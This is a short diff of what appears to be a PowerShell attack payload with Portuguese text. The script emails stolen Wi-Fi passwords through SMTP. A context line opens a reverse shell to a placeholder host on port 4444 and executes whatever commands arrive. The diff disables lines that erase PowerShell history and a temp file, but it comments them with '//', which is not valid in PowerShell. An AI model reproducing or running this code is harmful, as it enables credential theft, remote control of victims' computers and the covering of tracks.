@@ -22,8 +22,8 @@ $msg.Subject = "Senhas WIFI";
 $msg.Body = "<h2> Aqui as suas senhas </h2></br>olha o arquivo...";
 $SMTP.Credentials = $cred;
 $smtp.Send($msg);
-sleep 1
-del (Get-PSReadlineOption).HistorySavePath;
-sleep 0.1
-rm "$env:temp\\temp.csv"
+//sleep 1
+//del (Get-PSReadlineOption).HistorySavePath;
+//sleep 0.1
+//rm "$env:temp\\temp.csv"
 $sm=(New-Object Net.Sockets.TCPClient("HOST_IP_ADDRESS",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
